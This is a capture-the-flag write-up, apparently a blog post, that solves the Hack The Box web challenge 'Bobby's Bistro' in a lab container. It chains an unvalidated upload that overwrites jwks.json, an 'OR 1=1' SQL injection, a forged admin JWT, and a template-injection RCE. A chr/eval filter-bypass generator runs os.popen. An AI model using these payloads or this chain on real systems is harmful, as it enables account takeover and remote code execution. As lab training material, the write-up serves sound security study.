+++
title = "Bobby's Bistro"
date = 2024-01-14T07:07:07+01:00
draft = false
+++

# Bobby's Bistro

{{< figure src="/assets/bobbys-bistro/banner.png" >}}

Bobby's Bistro is a medium-level web challenge from Hack The Box.

## Setup test environment

For the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.

First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.

{{< figure src="/assets/bobbys-bistro/docker-debug-config.png" >}}

{{< figure src="/assets/bobbys-bistro/debug-supervidor.png" >}}

Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.

{{< figure src="/assets/bobbys-bistro/app-running.png" >}}

## Taint Analisys
The current objective of this fase is to understand the application by identifying its features, their functions, and the endpoints with which it communicates. Caido will be used as a proxy to record the endpoints identified during interaction with the system and to create a sitemap.

{{< figure src="/assets/bobbys-bistro/proxy-sitemap.png" >}}

Through interaction with the system, the following functionalities were identified: account registration, login, chat with image attachments, and reading announcements; additionally, a route providing JWKS data was found at `static/.well-known/jwks.json`.

{{< figure src="/assets/bobbys-bistro/jwks-json.png" >}}

With the source code, it is possible to discover new routes that were not accessed through manual interaction with the system, as well as to examine the implementation of already identified endpoints in search of potential vulnerabilities.

Administrator routes have been identified that can only be accessed with special permissions. In this context, it is also worth examining high-risk features or those that handle critical parts of the system, as a vulnerability in such a component typically carries a more severe impact.

The current phase, therefore, aims to analyze the implementation of the identified functionalities, looking for potential weaknesses and vulnerabilities.

The first method analyzed concerns how the system manages login and sessions, which is handled via these method:

```python
def setup_auth():
    kid = secrets.token_hex(16)
    private_key_jwk = jwk.JWK.generate(kty="RSA", size=2048, alg="RS256", use="sig")
    private_key_jwk.kid = kid

    private_jwk_json = private_key_jwk.export_private()
    public_jwk_json = private_key_jwk.export_public()

    if not os.path.exists("./keys"):
        os.mkdir("keys")
    with open("./keys/private_key.json", mode="w") as file:
        json.dump(json.loads(private_jwk_json), file)

    jwks = {"keys": [json.loads(public_jwk_json)]}

    with open("./static/.well-known/jwks.json", mode="w") as file:
        json.dump(jwks, file)

    return kid, private_jwk_json, public_jwk_json


def generate_token(claims, kid):
    headers = {"kid": kid, "alg": "RS256", "typ": "JWT"}
    with open("./keys/private_key.json") as file:
        private_key = jwk.JWK.from_json(file.read())

    private_pem = private_key.export_to_pem(private_key=True, password=None)

    token = jwt.encode(claims, private_pem, algorithm="RS256", headers=headers)
    return token


def verify_token(token):
    try:
        jwks_path = os.path.abspath("static/.well-known/jwks.json")
        jwks_client = PyJWKClient(f"file:///{jwks_path.replace(os.sep, '/')}")
        signing_key = jwks_client.get_signing_key_from_jwt(token)
        # print(signing_key.algorithm_name)

        decoded = jwt.decode(
            token,
            signing_key.key,
            algorithms=[signing_key.algorithm_name],
            options={"verify_signature": True},
        )
        return decoded
    except:
        return False
```

It can be noted that the `setup_auth` method is responsible for generating the public and private keys used to sign the JWT, as well as for writing the `jwks.json` file. As for `verify_token`, although it uses the `decode` method, which might appear insecure, it actually verifies the token's signature based on a private key that corresponds to the public key found in `jwks.json`. 

The `generate_token` method generates a token signed by the private key, containing the claims received via the parameter.

After creating an account in the system and authenticating, we can log in and identify the claims present in the JWT, in this case, only `user_id`.

{{< figure src="/assets/bobbys-bistro/user_id-claim.png" >}}

## File Upload + Arbitrary File Write

The system includes a file upload feature, which is always a high-risk area.

{{< figure src="/assets/bobbys-bistro/chat-file-upload.png" >}}

```python

@app.route("/api/chat-messages", methods=["GET", "POST"])
def chat_messages():
    # Return username, nickname, message, timestamp
    if request.method == "POST":
        cookie = request.cookies.get("auth_token", "")
        if not cookie:
            return jsonify({"error": "unauthorized"}), 401
        dictionary = verify_token(cookie)
        if not dictionary:
            return jsonify({"error": "unauthorized"}), 401
        else:
            username = User.query.filter_by(id=dictionary["user_id"]).first().username
            message = request.form.get("message")
            file = request.files.get("attachment")
            new_chat_message = ChatMessage(
                timestamp=str(datetime.now()),
                content=message,
                sender=username,
                attachments=UPLOADS_DIR + "/" + file.filename,
            )
            if file.filename:
                file.save(UPLOADS_DIR + "/" + file.filename)
            db.session.add(new_chat_message)
            db.session.commit()
            return redirect(url_for("chat_home"))
    if request.method == "GET":
        cookie = request.cookies.get("auth_token", "")
        if not cookie:
            return jsonify({"error": "unauthorized"}), 401
        dictionary = verify_token(cookie)
        if not dictionary:
            return jsonify({"error": "unauthorized"}), 401
        messages = ChatMessage.query.all()
        json_array = []
        for i in messages:
            json_array.append([i.timestamp, i.content, i.sender, i.attachments])
        return jsonify({"success": True, "messages": json_array})
    return {}

```
Focusing on the POST method for this endpoint, it can be observed that the system receives the file from the request and saves its content to `{UPLOADS_DIR}` + the filename, without any form of validation for either the content or the name. This operation performed by the system serves as a potential sink for exploitation, opening up vectors for path traversal and arbitrary file write.

```python
UPLOADS_DIR = str(BASE_DIR) + "/uploads"
```

In the context of a Flask application, you cannot simply upload a Python-based webshell for the web server to interpret in the same way it might handle a PHP script. However, it is important to keep in mind the possibility of writing arbitrary files to the system's directories.

### JWKS Poisoning

With an arbitrary file write vector, it is possible to replace the data in `jwks.json` with a file containing parameters under our control; this allows for the forging of a JWT signature, including a token that grants administrative access to the system and entry to privileged routes.

These commands can be used to generate a valid RSA public and private key pair that can be used for token signing:

```sh
openssl genrsa -out private_key.pem 2048
```

```sh
openssl rsa -in private_key.pem -pubout -out public_key.pem
```

Once the keys have been created, we need to generate a `jwks.json` file that uses the public key parameters, enabling the token to be signed with the private key. This can be done using the following script:

```python
import base64, json
from cryptography.hazmat.primitives import serialization

pub = serialization.load_pem_public_key(open("public_key.pem", "rb").read())
n, e = pub.public_numbers().n, pub.public_numbers().e

b64u = lambda i, l: base64.urlsafe_b64encode(i.to_bytes(l, "big")).rstrip(b"=").decode()

jwks = {
    "keys": [{
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "kid": "key-1",
        "n": b64u(n, (n.bit_length() + 7) // 8),
        "e": b64u(e, 3),
    }]
}
print(json.dumps(jwks, indent=2))
```

{{< figure src="/assets/bobbys-bistro/jwks-py.png" >}}

Using the identified arbitrary file write, it is possible to replace the original jwks.json with this modified version.

{{< figure src="/assets/bobbys-bistro/afw-req.png" >}}

{{< figure src="/assets/bobbys-bistro/mod-jwks.png" >}}

It has now become possible to sign a token using our private key; the challenge now lies in finding a useful claim, specifically, a valid user ID, since the only one we have access to is that of the user themselves.

## SQL Injection

With the goal of obtaining information regarding other users' IDs, the candidates for analysis are routes that interact directly with user data, as any vulnerabilities discovered could lead to the leakage of such information.

The current candidates for this phase are the chat-messages and profile routes, as they satisfy the requirement of interacting with user data, given that the chat-message route, when returning message responses, includes the username of the person who posted the message.

The profile route returns the user ID, which makes it an interesting target for attempting to retrieve the admin's ID.

{{< figure src="/assets/bobbys-bistro/profile-page.png" >}}


```python
@app.route("/profile", methods=["GET", "POST"])
@chameleon_flask.template("profile.pt")
def profile():
    if request.method == "GET":
        cookie = request.cookies.get("auth_token", "")
        if not cookie:
            return redirect(url_for("login"))
        decoded = verify_token(cookie)
        if not decoded:
            return redirect(url_for("login"))
        uid = decoded["user_id"]
        user = User.query.filter_by(id=uid).first()
        if not user:
            return redirect(url_for("register"))
        return {"user_data": [], "token": user.token}
    if request.method == "POST":
        cookie = request.cookies.get("auth_token", "")
        if not cookie:
            return redirect(url_for("login"))
        decoded = verify_token(cookie)
        if not decoded:
            return redirect(url_for("login"))
        uid = decoded["user_id"]
        user = User.query.filter_by(id=uid).first()
        if not user:
            return redirect(url_for("register"))
        token = request.form.get("token")
        user_data = (
            db.session.query(User).filter(text("token='{}'".format(token))).all()
        )
        print(user_data)
        return {"user_data": user_data, "token": user.token}
```

Analyzing the POST method for this route, one can observe the following issue: `user_data = (
db.session.query(User).filter(text("token='{}'".format(token))).all())`

Even though SQLAlchemy is used as an ORM, the system employs a user-controlled parameter to construct the query text, rather than utilizing the ORM's functions to build the query in a secure manner. Consequently, a sink for SQL injection was identified.

By exploiting this vector, it is possible to exfiltrate the IDs of all users in the database, including the admin's, using the payload `token='OR 1=1 -- -`

{{< figure src="/assets/bobbys-bistro/sqli-req.png" >}}

With this, the claim needed to generate the admin's self-signed JWT was obtained, making it possible to impersonate the administrative session.

## Admin's session

Using the two identified attack vectors, it is possible to:
1. Obtain the admin ID via SQL injection.
2. Replace the `jwks.json` file with a modified version containing our own key data.
3. Create a JWT signed with the private key, including the admin ID as a claim, thereby achieving privilege escalation.

Steps 1 and 2 have already been completed in previous sessions; to finish step 3, you must first import the data from the generated RSA key:

{{< figure src="/assets/bobbys-bistro/import-key.png" >}}

Replace the user_id from the original token with the administrator's user_id and sign the token using our key:

{{< figure src="/assets/bobbys-bistro/sign-token.png" >}}

With the signed token, it is possible to replace the cookie stored in the browser with this token and assume an administrator session.

{{< figure src="/assets/bobbys-bistro/admin-profile.png" >}}

With this session, privileged routes become available, specifically the `/admin/announcements` route, which serves as an interface for interacting with the (privileged) POST method of the `/api/announcements` route.

## SSTI to RCE

{{< figure src="/assets/bobbys-bistro/page-adm-an.png" >}}

The `/admin/announcements` page contains a form that submits data to the `/api/announcements` route, which has this handler:

```python
@app.route("/api/announcements", methods=["GET", "POST"])
def announcements():
    if request.method == "GET":
        cookie = request.cookies.get("auth_token", "")
        if not cookie:
            return jsonify({"error": "unauthorized"}), 401
        dictionary = verify_token(cookie)
        if not dictionary:
            return jsonify({"error": "unauthorized"}), 401
        user_id = dictionary["user_id"]
        user = User.query.filter_by(id=user_id).first()
        if not user:
            return jsonify({"error": "unauthorized"}), 401
        announcements_array = Announcement.query.filter_by(
            receiver=user.username
        ).first()
        if user.username == admin_username:
            announcements_array = Announcement.query.filter_by(sender=user.username)
        json_array = []
        if announcements_array:
            for i in announcements_array:
                json_array.append([i.id, i.timestamp, i.sender, i.receiver])
        return jsonify(json_array), 200

    if request.method == "POST":
        cookie = request.cookies.get("auth_token", "")
        if not cookie:
            return jsonify({"error": "unauthorized"}), 401
        dictionary = verify_token(cookie)
        if not dictionary:
            return jsonify({"error": "unauthorized"}), 401
        user_id = dictionary["user_id"]
        user = User.query.filter_by(id=user_id).first()
        if not user or user.username != admin_username:
            return jsonify({"error": "unauthorized"}), 401

        title = request.form.get("title")
        content = markdown.markdown(request.form.get("announcement"))
        if content:
            for i in '$#{}"_.':
                content = content.replace(i, "")
        tpl = PageTemplate(content)
        res = tpl.render()
        users = User.query.all()
        for i in users:
            new_announcement = Announcement(
                timestamp=str(datetime.now()),
                sender=user.username,
                content=res,
                title=title,
                receiver=i.username,
            )
            db.session.add(new_announcement)
        db.session.commit()
        return jsonify({"success": True}), 200
```

The most interesting part is that this route reads the value of the `announcement` parameter and renders a template using that data. This sink allows for the creation of a malicious template that executes Python code, leading to RCE (Remote Code Execution). However, before the template is created, a validation step takes place in which the control characters `$#{}"_.` are removed.

```python
 if content:
    for i in '$#{}"_.':
      content = content.replace(i, "")
  tpl = PageTemplate(content)
  res = tpl.render()
```

As a result, common payloads like ${7*7} end up not working due to the validation.

{{< figure src="/assets/bobbys-bistro/ssti-test-input.png" >}}

{{< figure src="/assets/bobbys-bistro/ssti-test-result.png" >}}

By reading the template library documentation, you can identify other ways to write Python code that will be executed: https://mkennedy.codes/docs/chameleon-flask/user-guide/writing-templates.html#content-and-replacement-talcontent-and-talreplace

The `tal:content` and `tal:define` tags seem the most interesting for this purpose.

{{< figure src="/assets/bobbys-bistro/tal-content-input.png" >}}

{{< figure src="/assets/bobbys-bistro/tal-content-result.png" >}}

This proves that it is possible to execute Python code. The current issue is that the `mro` technique for executing arbitrary Python code relies on a syntax that includes `.` and `_` characters, which are flagged during the validation stage for this route.

Here you can see some bypass techniques for character validation in SSTI attacks: https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html#filter-bypasses

This article demonstrates the use of Python's `chr` function to construct dynamic strings, which can be quite useful for this bypass: https://www.yeswehack.com/fr/learn-bug-bounty/server-side-template-injection-exploitation


```python
import cmd

class PayloadGenerator(cmd.Cmd):
    prompt = "cmd> "

    def default(self, line):
        if line.lower() in ['exit', 'quit', 'q']:
            return True

        # Converte o texto para a string formatada
        payload = "+".join([f"chr({ord(c)})" for c in line])

        print(f"\n[Payload Gerado]:")
        print(payload)
        print("-" * 30 + "\n")

if __name__ == '__main__':
    PayloadGenerator().cmdloop()
```

This Python script converts strings provided via input into sequences of `chr` calls, serving as a utility to help create payloads using the aforementioned technique.

{{< figure src="/assets/bobbys-bistro/chr-script.png" >}}

The problem is that by using this generated chain of `chr` values, the result is the string `7*7` rather than the execution of the code, since the functions return the strings `7`, `*`, and `7`.

{{< figure src="/assets/bobbys-bistro/string-chr-input.png" >}}

{{< figure src="/assets/bobbys-bistro/string-chr-result.png" >}}

However, the solution is simple: place everything inside an `eval`, which will interpret the string as Python code.

{{< figure src="/assets/bobbys-bistro/eval-input.png" >}}


{{< figure src="/assets/bobbys-bistro/eval-result.png" >}}

In this context, everything necessary to execute Python code within an `eval` statement—by leveraging a `chr` bypass—is already available. The script can be used to generate the code `__import__('os').popen('cat /flag*').read()` and read the flag.

{{< figure src="/assets/bobbys-bistro/generate-payload.png" >}}

{{< figure src="/assets/bobbys-bistro/payload-input.png" >}}

{{< figure src="/assets/bobbys-bistro/payload-result.png" >}}

## Exploit Chain

The exploit chain is already established for obtaining the flag:
1. Retrieve the `user_id` via SQL Injection;
2. Overwrite `jwks.json` to enable the forging of a token signature containing the administrator's `user_id`;
3. Achieve RCE via SSTI, using an `eval` + `chr` bypass.

Applying this in production:

Exfiltrating the admin's `user_id`.

{{< figure src="/assets/bobbys-bistro/prod-sqli.png" >}}

Overwriting `jwks.json`
{{< figure src="/assets/bobbys-bistro/prod-overwrite.png" >}}

Signing a token with the administrator's `user id`.
{{< figure src="/assets/bobbys-bistro/prod-sign-token.png" >}}

Accessing the `announcement` creation screen.
{{< figure src="/assets/bobbys-bistro/prod-adm-an.png" >}}

SSTI payload.
{{< figure src="/assets/bobbys-bistro/prod-ssti-input.png" >}}

Reading the flag.
{{< figure src="/assets/bobbys-bistro/prod-ssti-result.png" >}}

